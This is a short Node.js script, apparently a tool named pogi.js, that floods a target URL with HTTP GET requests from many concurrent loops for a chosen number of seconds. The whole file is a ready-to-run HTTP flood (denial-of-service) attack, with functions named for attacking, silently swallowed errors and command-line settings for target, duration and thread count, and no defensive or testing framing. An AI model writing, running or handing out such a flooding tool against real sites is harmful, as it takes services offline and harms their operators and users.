const axios = require('axios');

async function sendHttpRequest(targetUrl) {
  try {
    await axios({
      method: 'GET',
      url: targetUrl,
      timeout: 1000, // Set timeout to ensure quick termination if the site is down
    });
  } catch (error) {
    // Handle error silently
  }
}

async function startAttack(targetUrl, duration, numThreads) {
  const endTime = Date.now() + duration * 1000;

  console.log('Starting attack...');

  const tasks = [];
  for (let i = 0; i < numThreads; i++) {
    tasks.push(new Promise(async (resolve) => {
      while (Date.now() < endTime) {
        await sendHttpRequest(targetUrl);
        console.log('Attack Sending...');
      }
      resolve();
    }));
  }

  await Promise.all(tasks);

  console.log('Attack finished');
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const numThreads = parseInt(process.argv[4], 10);

if (!targetUrl || isNaN(duration) || isNaN(numThreads)) {
  console.log('Usage: node pogi.js <targetUrl> <durationInSeconds> <numThreads>');
  process.exit(1);
}

startAttack(targetUrl, duration, numThreads);
